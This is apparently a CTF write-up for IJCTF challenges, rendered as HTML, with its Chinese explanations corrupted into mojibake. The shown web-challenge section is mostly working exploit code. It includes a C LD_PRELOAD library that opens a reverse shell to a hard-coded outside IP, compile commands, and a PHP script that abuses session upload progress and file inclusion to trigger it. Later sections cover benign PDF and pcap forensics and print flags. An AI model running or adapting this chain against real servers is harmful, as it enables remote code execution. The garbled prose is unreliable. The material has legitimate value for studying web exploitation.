<span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkLetterNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“å‚æ•° mode ä¸º chance çš„æ—¶å€™ä¼šè¿›è¡Œç»è¿‡ä¸¥æ ¼è¿‡æ»¤çš„æŒ‡ä»¤æ‰§è¡Œï¼Œè€Œ mode ä¸º bonus çš„æ—¶å€™åˆ™ä¼šè¿›è¡Œ includeã€‚ç»™å‡ºçš„ PHPINFO æ–‡ä»¶ä¸­ disable_function å‡ ä¹ç¦ç”¨äº†æ‰€æœ‰çš„å‡½æ•°ï¼ŒåŠ ä¸Šè¿‡æ»¤æä¸ºä¸¥æ ¼ï¼Œå› æ­¤ç›´æ¥æŒ‡ä»¤æ‰§è¡Œæ˜¯ä¸å¯èƒ½çš„ã€‚å¯ä»¥æ³¨æ„åˆ° <code>session.upload_progress.cleanup</code>  çš„å€¼ä¸º Offï¼Œä¹Ÿå°±æ˜¯è¯´å½“ POST æ–‡ä»¶ä¸Šä¼ å session ä¸ä¼šè¢«æ¸…ç†ï¼Œ<code>session.use_strict_mode</code> çš„å€¼ä¸º 0ã€‚è¿™æ„å‘³ç€è‡ªå®šä¹‰ä¸€ä¸ªä¼šè¯ IDï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨ PHP_SESSION_UPLOAD_PROGRESS è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚ä¸Šä¼ åˆ° <code>/tmp</code> çš„æ–‡ä»¶ä¼šåœ¨è¿›ç¨‹ç»“æŸåè¢«åˆ é™¤ï¼Œå› æ­¤éœ€è¦å†™å‡º <code>for(;;)&#123;&#125;</code> æ¥é˜»å¡æ‰§è¡Œè¿›ç¨‹ã€‚</p><h4 id="åå¼¹-shell-çš„æ„é€ "><a href="#åå¼¹-shell-çš„æ„é€ " class="headerlink" title="åå¼¹ shell çš„æ„é€ "></a>åå¼¹ shell çš„æ„é€ </h4><p>å¯ä»¥å‘ç°åœ¨ PHPINFO æ–‡ä»¶ä¸­ï¼Œ<code>putenv</code> å’Œ <code>mail</code> ä¸¤ä¸ªå‡½æ•°éƒ½è¿˜èƒ½ä½¿ç”¨ï¼Œå› æ­¤å°è¯•å†™å…¥ LD_PRELOADï¼Œä½¿ç”¨ <code>mail</code> å‡½æ•°æ¥è§¦å‘ä¸€ä¸ªåå¼¹ shellã€‚æ„é€ å‡ºå¦‚ä¸‹åå¼¹ shell çš„ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serveraddr</span>;</span></span><br><span class="line">        <span class="keyword">int</span> server_sockfd;</span><br><span class="line">        <span class="keyword">int</span> client_len;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">80</span>],rbuf[<span class="number">80</span>], *cmdBuf[<span class="number">2</span>]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        server_sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">6</span>);</span><br><span class="line">        serveraddr.sin_family = AF_INET;</span><br><span class="line">        serveraddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.136.8.210&quot;</span>); </span><br><span class="line">        serveraddr.sin_port = htons(atoi(<span class="string">&quot;3255&quot;</span>));</span><br><span class="line">        client_len = <span class="keyword">sizeof</span>(serveraddr);</span><br><span class="line"></span><br><span class="line">        connect(server_sockfd, (struct sockaddr*)&amp;serveraddr, client_len);</span><br><span class="line"></span><br><span class="line">        dup2(server_sockfd, <span class="number">0</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">1</span>);</span><br><span class="line">        dup2(server_sockfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,cmdBuf,<span class="number">0</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œç¼–è¯‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c -fPIC shell.c -o shell</span><br><span class="line">$ gcc -shared shell -o shell.so</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ç”¨äºåå¼¹ shellã€‚å†æ„é€ å‡ºå¦‚ä¸‹ PHP æ–‡ä»¶ç”¨äºè¿›è¡Œ LD_PRELOAD è¿›è€Œè§¦å‘åå¼¹ shellã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=./shell.so&quot;</span>); <span class="comment">//æ­¤å¤„çš„æ–‡ä»¶åè¿˜éœ€è¦æ›´æ”¹</span></span><br><span class="line">    mail(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™å‡ºå¦‚ä¸‹è„šæœ¬æ¥ä¸€æŠŠæ¢­è§¦å‘åå¼¹ shellã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exploit</span></span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://8.136.8.210:10030&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;base_uri&quot;</span> =&gt; <span class="variable">$URL</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">3.0</span></span><br><span class="line">));</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&quot;for(;;)&#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;N&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; Psr7\Utils::tryFopen(<span class="string">&quot;./shell.so&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;shell.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp1;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp1&quot;</span></span><br><span class="line">    )</span><br><span class="line">));</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line"><span class="variable">$content</span> = str_replace(<span class="string">&quot;Welcome!!upload_progress_N|&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$tmpLibName</span> = unserialize(<span class="variable">$content</span>)[<span class="string">&quot;files&quot;</span>][<span class="number">0</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmpLibName</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&#x27;for(;;)&#123;&#125;&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;&lt;?php putenv(\&quot;LD_PRELOAD=<span class="subst">$tmpLibName</span>\&quot;); mail(\&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;); ?&gt;&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;none.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp2;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp2&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° shell åæ‰§è¡Œæ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ijctf&#123;the_memories_from_the_past&#125;</span><br></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Riddle-Joker"><a href="#Riddle-Joker" class="headerlink" title="Riddle Joker"></a>Riddle Joker</h3><blockquote><p>Joker has returned from his imprisonment. Rumour says that heâ€™s scheming a new evil operation by implanting several bombs at a local bank. Each of bomb has a tag information that might be a clue for finding Jokerâ€™s secret.</p><p>Author: <code>Avilia#1337</code></p></blockquote><p>å°†é™„ä»¶ä¸­çš„ PDF æ–‡ä»¶ç”¨ 010 Editor æ‰“å¼€ï¼Œå¯ä»¥å‘ç°åœ¨ 690 æµçš„åœ°æ–¹æœ‰ä¸€ä¸ªåµŒå…¥æ–‡ä»¶ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">78 9C 0B F0 66 66 11 61 66 64 60 60 F0 6C FB 12</span><br><span class="line">B4 5C 22 90 C5 04 C8 D6 00 62 0E 20 4E CB 49 4C</span><br><span class="line">D7 2B A9 28 39 51 29 77 66 1E AF 6A DC E6 3D A7</span><br><span class="line">E7 88 76 0A 88 AD FA 22 BA EC D9 FD D6 FB 79 75</span><br><span class="line">91 1A BF 2A E6 3F 2F BF D0 D3 3C C3 AE 68 95 CD</span><br><span class="line">DA 3B 8D 9F 5E 2E 6A 7F D7 7E FB 41 80 37 23 93</span><br><span class="line">3D 33 2E B3 55 18 20 40 A1 61 4B 23 03 92 4D 5C</span><br><span class="line">0C 0A 60 71 46 06 09 86 86 4B 0C 4B 7D 6A AF 33</span><br><span class="line">A2 D3 01 DE AC 6C 10 35 8C 0C 51 40 3A 0A AC 03</span><br><span class="line">00 B9 35 3B 19</span><br></pre></td></tr></table></figure><p>å°†å…¶ç”¨ zlib è§£å‹ä¸€æ¬¡å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œå…¶ä¸­åŒ…å«å¸¦å¯†ç çš„ flag.txtã€‚åœ¨ PDF æ–‡ä»¶ä¸­èƒ½å‘ç°å¾ˆå¤š xrefï¼Œè¿˜æœ‰ imagemagick çš„æ ‡è¯†ï¼ŒçŒœæµ‹å…¶ä¸­æœ‰å¾ˆå¤šå¼ å›¾ç‰‡ï¼ŒåŒæ—¶å¯ä»¥å‘ç° Coordinate çš„å­—æ ·ï¼Œå¯ä»¥å‘ç°è®¸å¤šåæ ‡ã€‚é€šè¿‡æœç´¢å¯ä»¥å‘ç°å¦‚ä¸‹å‚è€ƒæ–‡æ¡£ï¼Œä½¿ç”¨å…¶ä¸­çš„å·¥å…·æ„é€ å¦‚ä¸‹è„šæœ¬è¿˜åŸå›¾ç‰‡ã€‚</p><blockquote><p><a href="https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/">https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/</a></p><p><a href="https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/">https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">500</span>, <span class="number">500</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    os.system(<span class="string">f&quot;python3 pdftool.py iu secret.pdf -s<span class="subst">&#123;x&#125;</span> -d &gt; tmp.pdf&quot;</span>)</span><br><span class="line">    x, y = os.popen(<span class="string">f&quot;exiftool -Coordinate tmp.pdf&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span> image&quot;</span>)</span><br><span class="line">    os.system(<span class="string">f&quot;convert tmp.pdf -colorspace RGB tmp.png&quot;</span>) <span class="comment"># imagemagick</span></span><br><span class="line">    smallImage = Image.<span class="built_in">open</span>(<span class="string">&quot;tmp.png&quot;</span>)</span><br><span class="line">    image.paste(smallImage, (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)))</span><br><span class="line">    smallImage.close()</span><br><span class="line">image.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹äºŒç»´ç å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w"></p><p>ä½¿ç”¨å·¥å…·è¯»å–è¯¥äºŒç»´ç å†…å®¹å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The passcode is sup3r__cred3nti4l_p4sscode_3da748</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>sup3r__cred3nti4l_p4sscode_3da748</code> è§£å‹å‹ç¼©æ–‡æ¡£å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;4bbffb87ecc31ba242772ab1f14f569c&#125;</span><br></pre></td></tr></table></figure><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><blockquote><p>A robber broke into a our vault in the middle of night. Thereâ€™s an indication that the robber tried to steal some items which are considered as a confidential asset. Could you figured it out?</p><p>Flag format: <code>IJCTF&#123;[a-f0-9]&#123;32&#125;&#125;</code></p><p>Author: <code>Avilia#1337</code></p><p>When incident happened, the attacker got into our <code>IP over ICMP</code> tunnel network to access <code>HTTP/2</code> web-server with <code>SSL</code> enabled</p><p>Even so, our captured logs arenâ€™t precise enough. Each packet has an unusual timestamp and itâ€™s kinda messsyâ€¦</p></blockquote><h4 id="æµé‡åŒ…å¤„ç†"><a href="#æµé‡åŒ…å¤„ç†" class="headerlink" title="æµé‡åŒ…å¤„ç†"></a>æµé‡åŒ…å¤„ç†</h4><p>æ ¹æ®æç¤ºå¯çŸ¥æµé‡åŒ…ä¸­çš„æµé‡çš„æ—¶é—´æˆ³æœ‰äº›é—®é¢˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ Wireshark è‡ªå¸¦çš„å·¥å…·å…ˆå¯¹æµé‡è¿›è¡Œæ’åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reordercap</span> log.pcap log_ordered.pcap</span><br></pre></td></tr></table></figure><p>å¯¹æ’å¥½åºçš„æµé‡åŒ…è¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯ ICMP æµé‡ï¼Œè¿˜æœ‰ä¸€äº›æ˜¯ IPv4 çš„æ•°æ®ã€‚å¯¹å…¶è¿›è¡Œåˆ†æå¯ä»¥å‘ç°ä¸¤ä¸ª IPv4 ä¸­å¤¹æ‚ç€ä¸€æ®µæ•°æ®ï¼Œæœå¯»ä¹‹åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨äºä½¿ç”¨ ICMP è¿›è¡Œé€šè®¯çš„å·¥å…· Hansã€‚å°è¯•å°† Hans æ’å…¥çš„æ•°æ®åˆ é™¤ï¼Œæ¢å¤åŸæœ¬çš„ç»“æ„ã€‚</p><blockquote><p><a href="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627393585872788/6d42abe0873a356c246805386df413313aa7304c.png"></p><blockquote><p><a href="https://www.wireshark.org/docs/man-pages/editcap.html">https://www.wireshark.org/docs/man-pages/editcap.html</a></p></blockquote><p>ä½¿ç”¨ Wireshark çš„ editcap å·¥å…·å¯¹æ•°æ®è¿›è¡Œç¼–è¾‘ï¼Œåˆ é™¤ Hans æ’å…¥çš„ 33 ä¸ªå­—èŠ‚æ•°æ®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> -C 15:33 .\log_ordered.pcap .\log_processed.pcap</span><br></pre></td></tr></table></figure><p>æ‰“å¼€å¤„ç†å¥½çš„æµé‡åŒ…ï¼Œå¯ä»¥å‘ç°ä¸€äº› Socks å’Œ TCP æµé‡ï¼Œæ ¹æ®æç¤ºå°† Socks æµé‡é‡æ–°è®¾ç½®è§£ç ä¸º TLSã€‚è·Ÿè¸ª TCP æµåˆ° 0 å¯ä»¥å‘ç°ä¼ è¾“çš„ SSL Key Log fileã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627394559649768/b9ac84b81dcff4e6d1cedebd96b2f292301a210d.png"></p><p>å°†å…¶å¯¼å‡ºåä¿å­˜ä¸ºæ–‡ä»¶ï¼Œå°†éƒ¨åˆ†æ¢è¡Œç¬¦ä¿®æ­£ä¸ºç©ºæ ¼ï¼Œå¯¼å…¥åˆ° Wireshark ä¸­è§£å¯† TLS æµé‡ã€‚</p><h4 id="HTTP2-æµé‡çš„åˆ†æ"><a href="#HTTP2-æµé‡çš„åˆ†æ" class="headerlink" title="HTTP2 æµé‡çš„åˆ†æ"></a>HTTP2 æµé‡çš„åˆ†æ</h4><p>è§£å¯†çš„ TLS æµé‡ä¸­æœ‰å¾ˆå¤šå«æœ‰ data å’Œ content-range çš„æ•°æ®ä¼ è¾“ã€‚å°† SSL Key Log file æ³¨å…¥è¿›æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> --inject-secrets tls,sslkeylogfile log_processed.pcap log_decrypted.pcap</span><br></pre></td></tr></table></figure><p>å°†æµé‡ä¸­å«æœ‰çš„ data å’Œå¯¹åº”éƒ¨åˆ†çš„ range å–å‡ºï¼Œä½¿ç”¨å¦‚ä¸‹çš„ CyberChef  Receipt å¤„ç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tshark</span> -r ./log_decrypted.pcap -Y <span class="string">&quot;http2&quot;</span> -T fields -e http2.headers.range -e http2.data.data &gt; data.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 